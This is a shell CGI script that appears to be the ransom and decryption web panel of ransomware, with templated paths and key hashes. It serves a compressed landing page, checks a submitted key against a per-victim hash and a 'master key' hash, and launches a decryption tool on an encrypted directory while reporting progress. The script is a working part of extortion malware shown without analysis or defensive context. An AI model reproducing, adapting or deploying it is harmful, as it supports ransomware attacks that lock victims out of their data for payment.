#!/bin/sh

get_value () {
	echo "$1" | awk -F "${2}=" '{ print $2 }' | awk -F '&' '{ print $1 }'
}

not_running() { echo '{"status":"not_running"}'; exit; }

PID_FILENAME={PATH_PID_FILENAME}
STATUS_FILENAME={PATH_STATUS_FILENAME}
FINISH_FILENAME={PATH_FINISH_FILENAME}
T00L={PATH_TOOL}
CRYPTDIR={PATH_CRYPT}

if [ "x$REQUEST_METHOD" == "xPOST" ]; then
	echo "Content-Type: application/json"
	echo ""

	DATA=`dd count=$CONTENT_LENGTH bs=1 2> /dev/null`'&'
	ACTION=$(get_value "$DATA" "action")
	if [ "x$ACTION" == "xdecrypt" ]; then
		KEY=$(get_value "$DATA" "key")
		if [ "${#KEY}" != 32 ]; then
			echo "invalid key len"
			exit
		fi

		K=/tmp/k-$RANDOM
		echo -n > $K
		for i in `seq 0 2 30`; do
			printf "\x"${KEY:$i:2} >> $K
		done

		if ! command -v sha256sum &>/dev/null; then
			SUM=$(cat $K | openssl dgst -sha256 | egrep -o '[0-9a-f]{64}')
		else
			SUM=$(sha256sum $K | awk '{ print $1 }')
		fi

		rm $K

		if [ "x$SUM" == "x{KEYHASH}" ]; then
			echo '{"msg":"correct key"}'
			if [ -f /usr/bin/nohup ]; then
				(nohup ${T00L} -d "$KEY" "$CRYPTDIR" >/dev/null 2>/dev/null) &
				exec >&-
				exec 2>&-
			else
				exec >&-
				exec 2>&-
				${T00L} -d "$KEY" "$CRYPTDIR"
			fi
		elif [ "x$SUM" == "x{MASTER_KEYHASH}" ]; then
			echo '{"msg":"correct master key"}'
			if [ -f /usr/bin/nohup ]; then
				(nohup ${T00L} -d "$KEY" "$CRYPTDIR" >/dev/null 2>/dev/null) &
				exec >&-
				exec 2>&-
			else
				exec >&-
				exec 2>&-
				${T00L} -d "$KEY" "$CRYPTDIR"
			fi
		else
			echo '{"msg":"wrong key"}'
		fi
	elif [ "x$ACTION" == "xstatus" ]; then
		if [ -f "$FINISH_FILENAME" ]; then
			echo '{"status":"finished"}'
			exit
		fi

		if [ -f "$PID_FILENAME" ]; then
			PID=$(cat "$PID_FILENAME")
			if [ "x$PID" == "x" ]; then
				not_running
			fi
			if [ ! -d "/proc/$PID" ]; then
				not_running
			fi
		fi

		if [ -f "$STATUS_FILENAME" ]; then
			COUNT=$(cat "$STATUS_FILENAME")
			echo '{"status":"running","count":"'${COUNT}'"}'
		else
			not_running
		fi
	else
		echo '{"msg":"invalid action"}'
	fi
else
	echo "Content-Type: text/html"
	echo ""
	/bin/echo -en "{INDEX_PAGE_COMPRESSED}" 2>/dev/null | gzip -dc 2>/dev/null
fi
